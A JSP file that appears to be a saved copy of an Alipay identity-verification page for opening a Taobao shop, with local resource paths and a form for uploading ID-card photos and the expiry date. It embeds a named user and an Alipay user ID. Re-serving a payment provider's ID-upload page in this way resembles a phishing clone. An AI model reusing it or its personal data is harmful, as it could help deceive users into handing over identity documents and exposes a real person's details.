<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8" %>
<!DOCTYPE html>

<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="keywords" content="">
    <meta name="description" content="">
    <meta name="renderer" content="webkit">
    <meta name="force-rendering" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>身份验证</title>
    <link rel="icon" href="https://i.alipayobjects.com/common/favicon/favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="https://i.alipayobjects.com/common/favicon/favicon.ico" type="image/x-icon">


    <link sid="commonCss" rel="stylesheet"
          href="https://custweb.alipay.com/certify/v3/personal/tb_kaidian?continue=https%3A%2F%2Fopenshop.taobao.com%2Fopenshop%2Fwelcome.htm">


    <link href="https://a.alipayobjects.com/" rel="dns-prefetch">
    <link href="https://app.alipay.com/" rel="dns-prefetch">
    <link href="https://my.alipay.com/" rel="dns-prefetch">
    <link href="https://lab.alipay.com/" rel="dns-prefetch">
    <link href="https://cashier.alipay.com/" rel="dns-prefetch">
    <link href="https://financeprod.alipay.com/" rel="dns-prefetch">
    <link href="https://shenghuo.alipay.com/" rel="dns-prefetch">

    <!-- FD:106:alipay/tracker/seajs.vm:START -->


    <!-- monitor 防错代码 -->
    <script>
        (function (win) {
            if (!win.monitor) {
                win.monitor = {};
            }

            var METHODS = ["lost", "log", "error", "on", "off"];

            for (var i = 0, method, l = METHODS.length; i < l; i++) {
                method = METHODS[i];
                if ("function" !== typeof win.monitor[method]) {
                    win.monitor[method] = function () {
                    };
                }
            }
        })(window);
    </script>

    <!-- seajs以及插件 -->
    <script charset="utf-8" crossorigin="anonymous" id="seajsnode"
            onerror="window.monitor &amp;&amp; monitor.lost &amp;&amp; monitor.lost(this.src)"
            src="身份验证_files/saved_resource"></script>

    <!-- seajs config 配置 -->
    <script >
    seajs.config({
        alias: {
            '$': 'jquery/jquery/1.7.2/jquery',
            '$-debug': 'jquery/jquery/1.7.2/jquery',
            'jquery': 'jquery/jquery/1.7.2/jquery',
            'jquery-debug': 'jquery/jquery/1.7.2/jquery-debug',
            'seajs-debug': 'seajs/seajs-debug/1.1.1/seajs-debug'
        },
        crossorigin: function (uri) {

            function typeOf(type) {
                return function (object) {
                    return Object.prototype.toString.call(object) === '[object ' + type + ']';
                }
            }

            var isString = typeOf("String");
            var isRegExp = typeOf("RegExp");

            var whitelist = [];

            whitelist.push('https://a.alipayobjects.com/');

            for (var i = 0, rule, l = whitelist.length; i < l; i++) {
                rule = whitelist[i];
                if (
                    (isString(rule) && uri.indexOf(rule) === 0) ||
                    (isRegExp(rule) && rule.test(uri))
                ) {

                    return "anonymous";
                }
            }
        },
        vars: {
            locale: 'zh-cn'
        }
    });
    </script>

    <!-- 兼容原有的 plugin-i18n 写法 -->
    <!-- https://github.com/seajs/seajs/blob/1.3.1/src/plugins/plugin-i18n.js -->
    <script>
        seajs.pluginSDK = seajs.pluginSDK || {
            Module: {
                _resolve: function () {
                }
            },
            config: {
                locale: ''
            }
        };
        // 干掉载入 plugin-i18n.js，避免 404
        seajs.config({
            map: [
                [/^.*\/seajs\/plugin-i18n\.js$/, ''],
                [/^.*\i18n!lang\.js$/, '']
            ]
        });
    </script>

    <!-- 路由旧 ID，解决 seajs.use('select/x.x.x/select') 的历史遗留问题 -->
    <script>
        (function () {

            var JQ = '/jquery/1.7.2/jquery.js';
            seajs.cache['https://gw.alipayobjects.com/a/gallery' + JQ] = seajs.cache['https://gw.alipayobjects.com/a/jquery' + JQ];

            var GALLERY_MODULES = [
                'async', 'backbone', 'coffee', 'cookie', 'es5-safe', 'handlebars', 'iscroll',
                'jasmine', 'jasmine-jquery', 'jquery', 'jquery-color', 'json', 'keymaster',
                'labjs', 'less', 'marked', 'moment', 'mustache', 'querystring', 'raphael',
                'socketio', 'store', 'swfobject', 'underscore', 'zepto', 'ztree'
            ];

            var ARALE_MODULES = [
                'autocomplete', 'base', 'calendar', 'class', 'cookie', 'dialog', 'easing',
                'events', 'iframe-uploader', 'iframe-shim', 'messenger', 'overlay', 'popup',
                'position', 'select', 'switchable', 'tip', 'validator', 'widget'
            ];

            var util = {};
            util.indexOf = Array.prototype.indexOf ?
                function (arr, item) {
                    return arr.indexOf(item);
                } :
                function (arr, item) {
                    for (var i = 0; i < arr.length; i++) {
                        if (arr[i] === item) {
                            return i;
                        }
                    }
                    return -1;
                };
            util.map = Array.prototype.map ?
                function (arr, fn) {
                    return arr.map(fn);
                } :
                function (arr, fn) {
                    var ret = [];
                    for (var i = 0; i < arr.length; i++) {
                        ret.push(fn(arr[i], i, arr));
                    }
                    return ret;
                };

            function contains(arr, item) {
                return util.indexOf(arr, item) > -1
            }

            function map(id) {
                id = id.replace('#', '');

                var parts = id.split('/');
                var len = parts.length;
                var root, name;

                // id = root/name/x.y.z/name
                if (len === 4) {
                    root = parts[0];
                    name = parts[1];

                    // gallery 或 alipay 开头的没有问题
                    if (root === 'alipay' || root === 'gallery') {
                        return id;
                    }

                    // arale 开头的
                    if (root === 'arale') {
                        // 处理 arale/handlebars 的情况
                        if (contains(GALLERY_MODULES, name)) {
                            return id.replace('arale/', 'gallery/');
                        } else {
                            return id;
                        }
                    }
                }
                // id = name/x.y.z/name
                else if (len === 3) {
                    name = parts[0]

                    // 开头在 GALLERY_MODULES 或 ARALE_MODULES
                    if (contains(GALLERY_MODULES, name)) {
                        return 'gallery/' + id;
                    } else if (contains(ARALE_MODULES, name)) {
                        return 'arale/' + id;
                    }
                }

                return id;
            }

            var _use = seajs.use;

            seajs.use = function (ids, callback) {
                if (typeof ids === 'string') {
                    ids = [ids];
                }

                ids = util.map(ids, function (id) {
                    return map(id);
                });

                return _use(ids, callback);
            }

        })();
    </script>
    <!-- FD:106:alipay/tracker/seajs.vm:END -->
    <script sid="spm">
        window._to = {
            autoExpo: true,
            bizType: 'registerLogin',
            spmAPos: 'a201',
            spmBPos: 'b2010',
            mdata: {
                bizcode: 'tb_kaidian',
                factorId: 'M',
                extinfo: ''
            },

            debug: false
        }
    </script>


    <script src="身份验证_files/index.js.下载"></script>
    <script src="身份验证_files/underscore-min.js.下载"></script>
    <script>
        (function () {
            if (!Object.defineProperty ||
                !(function () {
                    try {
                        Object.defineProperty({}, 'x', {});
                        return true;
                    } catch (e) {
                        return false;
                    }
                }())) {
                var orig = Object.defineProperty;
                Object.defineProperty = function (o, prop, desc) {
                    // In IE8 try built-in implementation for defining properties on DOM prototypes.
                    if (orig) {
                        try {
                            return orig(o, prop, desc);
                        } catch (e) {
                        }
                    }

                    if (o !== Object(o)) {
                        throw TypeError("Object.defineProperty called on non-object");
                    }
                    if (Object.prototype.__defineGetter__ && ('get' in desc)) {
                        Object.prototype.__defineGetter__.call(o, prop, desc.get);
                    }
                    if (Object.prototype.__defineSetter__ && ('set' in desc)) {
                        Object.prototype.__defineSetter__.call(o, prop, desc.set);
                    }
                    if ('value' in desc) {
                        o[prop] = desc.value;
                    }
                    return o;
                };
            }

            if (typeof String.prototype.trim !== 'function') {
                String.prototype.trim = function () {
                    return this.replace(/^\s+|\s+$/g, '');
                }
            }
        }());
    </script>
    <script src="身份验证_files/es6-promise.min.js.下载"></script>
    <!-- Polyfills -->

    <!--[if lt IE 10]>
    <script src="https://as.alipayobjects.com/g/component/??es5-shim/4.5.7/es5-shim.min.js,es5-shim/4.5.7/es5-sham.min.js,console-polyfill/0.2.2/index.js"></script>
    <![endif]-->
    <!--[if lte IE 11]>
    <script src="https://as.alipayobjects.com/g/component/??es5-shim/4.5.7/es5-shim.min.js,es5-shim/4.5.7/es5-sham.min.js"></script>
    <![endif]-->

    <!--[if !IE]><!-->
    <script src="身份验证_files/index.js(1).下载"></script>
    <!--<![endif]-->


    <link charset="utf-8" rel="stylesheet" type="text/css"
          href="身份验证_files/app_views_certify-v3_desktop_ic_index_html_css-2790b2435f9988446c88.css">
    <link charset="utf-8" rel="stylesheet" href="身份验证_files/doVVVkUglHpuXRbyNEvN.css">
</head>
<!--[if lt IE 7]>
<body class="ie6 "><![endif]-->
<!--[if IE 7]>
<body class="ie7 "><![endif]-->
<!--[if lt IE 8]>
<script>location.search.indexOf("__debug") === -1 && location.replace('https://www.alipay.com/x/kill-ie.htm');</script>
<![endif]-->
<!--[if IE 8]>
<body class="ie8 "><![endif]-->
<!--[if IE 9]>
<body class="ie9 "><![endif]-->
<!--[if !IE]><!-->
<body><!--<![endif]-->


<div class="header">
    <div class="header-bg">
        <div class="header-info">
            <ul class="header-info-text">

                <li>你好，李美兵&nbsp;&nbsp;-&nbsp;<a href="https://auth.alipay.com/login/logout.htm">退出</a></li>

                <li><a target="_blank" href="https://www.alipay.com/">支付宝首页</a></li>
                <li><a target="_blank" href="https://mobile.alipay.com/">手机支付</a></li>
                <li><a target="_blank" href="https://cshall.alipay.com/">帮助中心</a></li>
                <li class="last">唯一热线：95188</li>
            </ul>
        </div>
    </div>
    <div class="banner">
        <div class="banner-container">
            <a class="logo" href="https://www.alipay.com/" target="_blank"></a>

            <div class="title">身份验证</div>

        </div>
    </div>
</div>


<div id="container" class="ui-container">


    <div class="ui-fields">


        <div class="process-wrap">


            <div class="message-wrap">
                <div class="ui-message-left">请上传本人身份证件，确保图片清晰，四角完整</div>
            </div>
        </div>

        <div class="ui-form-explain fn-hide">证件审核失败，请重新上传。失败原因：</div>

        <div class="ui-form">
            <div class="ui-form-item">
                <label class="ui-input-label">证件类型</label>
                <span class="ui-radio-group">
          <input id="certTypeNormal" type="radio" name="cardType" value="normal" checked=""><label for="certTypeNormal">二代身份证</label>
          
            <input id="certTypeInterim" type="radio" name="cardType" value="interim"><label
                        for="certTypeInterim">临时身份证</label>
          
          <input type="hidden" id="card_type" value="IDENTITY_CARD">
        </span>
            </div>

            <div class="ui-form-item upload-fields">
                <label class="ui-input-label">证件图片</label>
                <input type="hidden" id="card_face" name="hasFacePic" value="false">
                <input type="hidden" id="card_verso" name="hasVersoPic" value="false">

                <input type="hidden" id="face" name="face" value="false">

                <div class="upload-items">
                    <div class="upload-item">
                        <p class="ui-input-text title-face">个人信息页</p>
                        <iframe id="uploadPicture1" data-filekey="card_face" name="uploadPicture1"
                                src="身份验证_files/newUploadPic.html" scrolling="no" frameborder="0" height="80"
                                width="110"></iframe>

                        <div class="upload-example" tabindex="-1">
                            <div class="example-img person-page">
                                <img class="identity-card-img" src="身份验证_files/T1p4VfXoBpXXXXXXXX.png">
                            </div>
                            <div class="uploader-example-bg"></div>
                            <a class="identity-card-link" href="身份验证_files/T1p4VfXoBpXXXXXXXX.png" target="_blank">
                                <i class="iconfont uploader-example-icon"></i>
                                <span class="uploader-example-title">示例</span>
                            </a>
                        </div>
                        <div class="fm-explain card_face"></div>
                    </div>
                    <div class="upload-item" id="image_emblem_box">
                        <p class="ui-input-text title-verso">国徽页</p>
                        <iframe id="uploadPicture2" data-filekey="card_verso" name="uploadPicture2"
                                src="身份验证_files/newUploadPic(1).html" scrolling="no" frameborder="0" height="80"
                                width="110"></iframe>
                        <div class="upload-example" tabindex="-1">
                            <div class="example-img country-page">
                                <img src="身份验证_files/T1Kx4fXXtoXXXXXXXX.png">
                            </div>
                            <div class="uploader-example-bg"></div>
                            <a href="身份验证_files/T1Kx4fXXtoXXXXXXXX.png" target="_blank">
                                <i class="iconfont uploader-example-icon"></i>
                                <span class="uploader-example-title">示例</span>
                            </a>
                        </div>
                        <div class="fm-explain card_verso"></div>
                    </div>
                    <div class="upload-item temp-idcard" style="display:none;">
                        <p class="ui-input-text title-face">个人信息页</p>
                        <iframe id="uploadPicture3" data-filekey="card_face" name="uploadPicture3"
                                src="身份验证_files/newUploadPic(2).html" scrolling="no" frameborder="0" height="80"
                                width="110"></iframe>

                        <div class="upload-example" tabindex="-1">
                            <div class="example-img person-page">
                                <img class="temp-identity-card-img" src="身份验证_files/482Y8TPVeX.jpg">
                            </div>
                            <div class="uploader-example-bg"></div>
                            <a class="temp-identity-card-link" href="身份验证_files/482Y8TPVeX.jpg" target="_blank">
                                <i class="iconfont uploader-example-icon"></i>
                                <span class="uploader-example-title">示例</span>
                            </a>
                        </div>
                        <div class="fm-explain temp_card_face"></div>
                    </div>
                </div>

            </div>

            <div class="ui-form-item item-expired-date">
                <label class="ui-input-label">证件有效期</label>
                <div class="fn-inline input-expired-date">
                    <input type="text" maxlength="4" class="ui-input input-date input-date-y" id="validaty_y"
                           name="year">
                    <div class="ui-input-cut">年</div>
                    <input type="text" maxlength="2" class="ui-input input-date input-date-m" id="validaty_m"
                           name="month">
                    <div class="ui-input-cut">月</div>
                    <input type="text" maxlength="2" class="ui-input input-date input-date-d" id="validaty_d"
                           name="day">
                    <div class="ui-input-cut">日</div>
                </div>
                <p class="ui-input-text" id="J-long-term-box">
                    <input type="checkbox" id="long_term" name="isLongTerm">
                    <label for="long_term">长期</label>
                </p>
                <div class="ui-form-tip"></div>
            </div>


            <div class="ui-form-item agree-pocket" id="J_agreePocketBlock">
                <label class="ui-input-label"></label>

                <p class="ui-input-text" data-aspm-click="c6714.d11603">
                    <input type="checkbox" id="J_agreePocket" name="isAgreePocket">
                    <label for="J_agreePocket">同意将证件保存至卡包证件夹</label>
                </p>

            </div>


            <div class="ui-form-item">
                <label class="ui-input-label"></label>
                <div class="ui-btn ui-btn-blue" id="submit">确定提交</div>
                <div id="J-audit-tip" class="audit-tip">证件已提交审核，请耐心等待。</div>
            </div>


            <div class="qrcode-con">
                <div class="qrcode-img J-qrcode">
                    <canvas width="250" height="250" style="width: 200px; height: 200px;"></canvas>
                </div>
                <p>打开手机支付宝，扫一扫</p>
                <p>快速拍摄证件，极速验证</p>
                <a href="javascript:;" class="J-submit">已完成拍摄，点此继续认证</a>
            </div>

        </div>

    </div>


</div>


<script src="身份验证_files/moment.min.js.下载"></script>


<!-- clue START -->
<script sid="trackerJs" src="身份验证_files/tracker.Tracker.js.下载"></script>
<script src="身份验证_files/tracker.performanceTrackerPlugin.js.下载"></script>

<script sid="clue">
    var ClueTracker = window.Tracker.noConflict();
    var pid = 'custweb';
    var tracker = new ClueTracker({
        pid: pid,
        uidResolver: function () {
            // 具体获取 userId 逻辑自行实现
            return '2088212273630189';
        },
        plugins: [[performanceTrackerPlugin]]
    });
    // 全局变量
    window.tracker = tracker;
    // 监听 JS 异常（window.onerror）并自动打点
    tracker.onGlobalError();
    // 使用 Tracker 插件实现其它监控项的自动打点，以性能监控为例
    tracker.addPlugin([performanceTrackerPlugin]);
    // 监听promise rejection
    window.addEventListener('unhandledrejection', function (event) {
        try {
            var errorContext = event.reason;
            var errorType = Object.prototype.toString.call(errorContext);
            // 上报reject object或string的情况
            if (errorType === '[object Object]' || errorType === '[object String]') {
                tracker.log({
                    pid: pid,
                    code: 12,
                    msg: JSON.stringify(errorContext)
                });
            } else if (errorContext instanceof Error) {
                // 上报reject error的情况
                tracker.logError(errorContext, {
                    pid: pid,
                    code: 13
                });
            }
        } catch (e) {
            console.error('[clue][unhandledrejection]: ', e);
        }
    });
</script>
<!-- clue END -->


<!-- /component/footCommon.vm -->

<!-- FD:231:alipay/nav/versionSwitch.vm:START -->
<!-- FD:231:alipay/nav/versionSwitch.vm:1743:nav/versionSwitch.schema:versionSwitch-网站改版导航新老版本切换开关:START -->


<!-- FD:231:alipay/nav/versionSwitch.vm:1743:nav/versionSwitch.schema:versionSwitch-网站改版导航新老版本切换开关:END -->
<!-- FD:231:alipay/nav/versionSwitch.vm:END -->


<style>
    .ui-footer {
        margin-top: 30px;
        border-top: 1px solid #cccccc;
        height: 100px;
        color: #808080;
    }

    .ui-footer .ui-separator {
        font-weight: normal;
    }

    .ui-footer-ctn {
        border-top: 1px solid #ffffff;
        padding-top: 15px;
        text-align: center;
    }

    .ui-footer-link a {
        padding: 0 3px 0 2px;
    }

    .ui-footer-copyright, .ui-footer-phone {
        padding-top: 10px;
    }

    .ui-footer-copyright a, .ui-footer-copyright a:hover {
        color: #808080;
    }

    .server {
        color: #fff;
    }
</style>


<div class="ui-footer fn-clear" coor="footer">


    <div class="ui-footer-ctn">
        <!-- FD:231:alipay/foot/links.vm:START -->
        <!-- FD:231:alipay/foot/links.vm:2600:foot/links.schema:links-底部链接:START -->
        <div class="ui-footer-link">

            <a href="https://job.alibaba.com/zhaopin/index.htm" target="_blank" seed="foot-1">诚征英才</a>


            <em class="ui-separator">|</em>
            <a seed="foot-2" href="https://ab.alipay.com/i/lianxi.htm" title="联系我们" target="_blank">联系我们</a>

            <em class="ui-separator">|</em>
            <a seed="foot-3" href="https://global.alipay.com/" title="International Business" target="_blank">International
                Business</a>


        </div><!-- FD:231:alipay/foot/links.vm:2600:foot/links.schema:links-底部链接:END -->
        <!-- FD:231:alipay/foot/links.vm:END -->

        <div class="ui-footer-copyright">
            <!-- FD:231:alipay/foot/copyright.vm:START -->
            <!-- FD:231:alipay/foot/copyright.vm:2604:foot/copyright.schema:支付宝copyright:START -->
            <style>
                .copyright, .copyright a, .copyright a:hover {
                    color: #808080;
                }
            </style>
            <div class="copyright">

                <a href="https://fun.alipay.com/certificate/jyxkz.htm" target="_blank">ICP证：沪B2-20150087</a>

            </div>
            <div class="server" id="ServerNum">
                custweb-40-5673 &nbsp; 0bea906415458852410065565e03be
            </div>
            <!-- FD:231:alipay/foot/copyright.vm:2604:foot/copyright.schema:支付宝copyright:END -->
            <!-- FD:231:alipay/foot/copyright.vm:END -->
        </div>
    </div>
</div>
<!-- /component/footCommon.vm -->

<!-- FD:174:alipay/foot/cliveService.vm:START -->
<!-- FD:174:alipay/foot/cliveService.vm:1261:cliveService.schema:在线客服配置:START -->
<div style="display:none">onlineServer</div>
<script type="text/javascript">
    try {
        (function () {
            var loadOnlineServer = function () {
                seajs.config({
                    comboExcludes: /\/u\/(js|css|cschannel|ecmng)\//,
                    alias: {
                        '$': 'jquery/jquery/1.7.2/jquery',
                        'onlineServerConfig': 'https://os.alipayobjects.com/rmsportal/iwBOQWtuJpTikoO.js',
                        'portalServerConfig': 'https://os.alipayobjects.com/rmsportal/FiPHyRpEbxSvFkDoPXIQ.js',
                        'merchantServerConfig': 'https://gw.alipayobjects.com/os/cschannel/acMWoiSyXYEmIyNRMFNg.js',
                        'customerServerConfig': 'https://gw.alipayobjects.com/os/cschannel/eKIrsHTTgHXrEJIaDKxq.js',
                        'koubeiServerConfig': 'https://gw.alipayobjects.com/os/cschannel/pQmbmblGTxzzURaFbUca.js',
                        'defaultDataConfig': 'https://a.alipayobjects.com/u/js/201311/1acIoVU1Xx.js',
                        'onlineServerJS': 'https://gw.alipayobjects.com/os/rmsportal/qCVYBmFVhtCyXvSTVdGX.js',//云客服匹配
                        'onlineServerCSS': 'https://gw.alipayobjects.com/os/rmsportal/doVVVkUglHpuXRbyNEvN.css'//云客服通用样式
                    }
                });
                seajs.use(['onlineServerConfig', 'portalServerConfig', 'merchantServerConfig', 'koubeiServerConfig', 'customerServerConfig'], function () {
                    jQuery(function () {
                        window.OS = OS = {},
                            OS.server = {
                                cliveServer: 'https://clive.alipay.com',
                                cschannelServer: 'https://cschannel.alipay.com',
                                initiativeServer: 'https://webpushgw.alipay.com',
                                cshallServer: 'https://cshall.alipay.com'
                            },
                            OS.params = {
                                'uid': '2088212273630189'
                            };
                        var tradeNos4Clive = '' || '';
                        OS.params.featureStr = "{'tradeNos':'" + tradeNos4Clive + "'}";
                        OS.config = {
                            onlineServerURL: OS.server.cliveServer + '/csrouter.htm',
                            portalServerURL: OS.server.cschannelServer + '/csrouter.htm',
                            newPortalServerURL: OS.server.cschannelServer + '/newPortal.htm',
                            webpushFlashURL: 'https://t.alipayobjects.com/tfscom/T1JsNfXoxiXXXXXXXX.swf',
                            onlineServerIconDefault: 'https://a.alipayobjects.com/u/css/201401/1v9cu1dxaf.css' //在线客服默认图片
                        };
                        seajs.use('onlineServerCSS');
                        seajs.use('onlineServerJS');
                    });
                });
            }
            var bindOnlineServer = function (func) {
                var w = window;
                if (w.attachEvent) {
                    w.attachEvent('onload', func);
                } else {
                    w.addEventListener('load', func, false);
                }
            };
            window.initOnlineServer = function () {
                var w = window, o = 'seajs', d = document;
                if (w[o]) {
                    return loadOnlineServer()
                }
                var s = d.createElement("script")
                s.id = o + "node"
                s.charset = "utf-8";
                s.type = "text/javascript";
                s.src = "https://a.alipayobjects.com/??seajs/seajs/2.1.1/sea.js,jquery/jquery/1.7.2/jquery.js";
                var head = d.head || d.getElementsByTagName("head")[0] || d.documentElement;
                head.appendChild(s);
                s.onload = s.onreadystatechange = function () {
                    if (!s.readyState || /loaded|complete/.test(s.readyState)) {
                        loadOnlineServer()
                    }
                };
            };
            if (!window.isLazyLoadOnlineService) {
                bindOnlineServer(initOnlineServer);
            }
            ;
        })();
    } catch (e) {
        window.console && console.log && console.log(e);
        window.Tracker && Tracker.click('onlineServer-error-init-' + e);
    }
</script>
<!-- FD:174:alipay/foot/cliveService.vm:1261:cliveService.schema:在线客服配置:END -->

<!-- FD:174:alipay/foot/cliveService.vm:END -->

<script sid="commonJs" src="身份验证_files/common-157db041ab125a68e677.js.下载"></script>


<script>window.context = {
    "processStatus": "process",
    "flowStatusName": "Desktop",
    "actionBarSpm": "c4290.d6933",
    "spmParam": "factorId=M^bizCode=tb_kaidian^bizScenario=undefined",
    "factorId": "M",
    "bizCode": "tb_kaidian",
    "bizName": "CERTIFY",
    "bizScene": "CERTIFY_V3",
    "initActionUrl": "/certify/v3/personal/factor/init",
    "certifyUrl": "%2Fcertify%2Fv3%2Fpersonal%2Ffactor%2Fcertify%3FbizCode%3Dtb_kaidian%26continue%3Dhttps%253A%252F%252Fopenshop.taobao.com%252Fopenshop%252Fwelcome.htm",
    "systemErrorUrl": "%2Fcertify%2Fv3%2Fresult%2Ferror%2FSYSTEM_ERROR%3FbizCode%3Dtb_kaidian%26continue%3Dhttps%253A%252F%252Fopenshop.taobao.com%252Fopenshop%252Fwelcome.htm",
    "continueUrl": "%2Fcertify%2Fv3%2Fpersonal%2Ffactor%2Fcontinue%3Fcontinue%3Dhttps%253A%252F%252Fopenshop.taobao.com%252Fopenshop%252Fwelcome.htm%26locale%3Dzh-CN%26bizCode%3Dtb_kaidian%26factorId%3DM",
    "verifyUrl": "%2Fcertify%2Fv3%2Fpersonal%2Ffactor%2Fverify%3FbizCode%3Dtb_kaidian%26continue%3Dhttps%253A%252F%252Fopenshop.taobao.com%252Fopenshop%252Fwelcome.htm",
    "locales": {
        "NETWORK_ERROR": "网络不稳定，请切换网络或稍后再试。",
        "SYSTEM_ERROR": "人气大爆发，一会再试试。",
        "LOGIN_FAILED": "登录失败",
        "LOADING_TIP": "请稍后...",
        "CONFIRM": "确定",
        "SAVE": "保存",
        "CANCEL": "取消",
        "TITLE": "身份验证",
        "BACK": "返回",
        "DONE": "完成",
        "TIP": "身份信息未完成验证，建议继续完善。",
        "CONTINUE": "继续完善",
        "QUIT": "中途放弃",
        "YES": "好的",
        "CONFIRM_REDO_CERTIFY": "确定要重新认证？",
        "AUDITING": "已提交审核，请耐心等待。",
        "UPLOADING": "证件上传中，请稍候",
        "CAMERA_ERROR": "相机异常，请重拍。",
        "ALBUM": "相册",
        "TAKE": "拍照",
        "DEMO": "示例图",
        "RETAKE": "重拍",
        "TAKE_PHOTO": "拍摄",
        "RETAKE_LABEL": "重新拍摄",
        "EXPIRY_ACTION": "点击设置",
        "LONG_TERM": "长期",
        "EXPIRY_LONG_TERM": "有效期为长期",
        "INVALID_DATE_TIP": "日期无效，请重新选择",
        "DATE_MUST_AFTER_TODAY": "请选择今天之后的日期",
        "SELECT_PHOTOS_FROM_ALBUM": "从相册选择上传",
        "UNKNOWN_ERROR": "人气大爆发，一会再试试。"
    },
    "client": {
        "continue": "https%3A%2F%2Fopenshop.taobao.com%2Fopenshop%2Fwelcome.htm",
        "__directCallbackUrlList__": [{"urlPrefix": "https://mclient.alipay.com"}]
    },
    "aliAppVersion": "",
    "actionBar": {"button": "back", "action": "back"},
    "isSandBox": false,
    "factorData": {},
    "_extendData": {"queryTraceId": "0bea906415458852410065565e03be"},
    "canHookBack": false,
    "certType": "IDENTITY_CARD",
    "isAuditFail": false,
    "disableHMTOcr": false,
    "longTerm": "长期",
    "certifyStatus": "SENIOR_CERTIFY",
    "certifyReleaseType": "NOT_RELEASE",
    "uriBroker": {
        "app.url": "https://custweb.alipay.com",
        "custweb.url": "https://custweb.alipay.com",
        "morder.url": "https://b.alipay.com",
        "finsignweb.url": "https://finsignweb.alipay.com",
        "tzb.url": "http://render.stable.alipay.net/p/z/stockfd/index.html",
        "clientsc.url": "https://clientsc.alipay.com",
        "couriercore.url": "https://couriercore.alipay.com",
        "pcreditprod.url": "https://pcreditprod.alipay.com",
        "membercenter.url": "https://membercenter.alipay.com",
        "personalportal.url": "https://personalportal.alipay.com",
        "personalweb.url": "https://personalweb.alipay.com",
        "memberprod.url": "https://memberprod.alipay.com",
        "certifybffcloud.url": "http://certifybffcloud.d2727.mayibank.net",
        "mobileic.url": "https://mobileic.alipay.com",
        "certify.url": "https://certify.alipay.com",
        "publicexprod.url": "https://publicexprod.alipay.com",
        "mclient.url": "https://mclient.alipay.com",
        "taobaoaccount.url": "https://member1.taobao.com/member/fresh/h5/h5_account_management.htm",
        "authcenter.url": "https://auth.alipay.com",
        "cloudauth.url": "https://auth.cloud.alipay.com",
        "benefitprod.url": "https://zht.alipay.com",
        "productchannelKuai.url": "https://kuai.alipay.com",
        "csmobile.url": "https://csmobile.alipay.com",
        "tfsImage.url": "http://tfs.alipayobjects.com",
        "taobao.domain": "taobao.com",
        "taobao.port": 80,
        "taobao.timeout": 5000,
        "member.taobao.url": "http://member1.daily.taobao.net:80",
        "favicon.ico.url": "https://i.alipayobjects.com/common/favicon/favicon.ico",
        "app.404.url": "https://www.alipay.com/404.html",
        "zdrmdata.rest.url": "http://zdrmdata-pool.gz00c.alipay.com",
        "app.errorpage.url": "https://www.alipay.com/50x.html",
        "app.goto.url": "https://my.alipay.com/portal/i.htm",
        "bumng.url": "https://bumng.alipay.com",
        "rds.url": "https://rds.alipay.com",
        "omeo.check.url": "http://omeo-pool.gz00c.alipay.com",
        "omeo.get.url": "https://omeo.alipay.com",
        "assets.url": "https://gw.alipayobjects.com/a"
    }
};</script>
<script crossorigin="anonymous" type="text/javascript"
        src="身份验证_files/app_views_certify-v3_desktop_ic_index_html_js-f4ad3cea904269a4a602.js.下载"></script>

</body>
</html>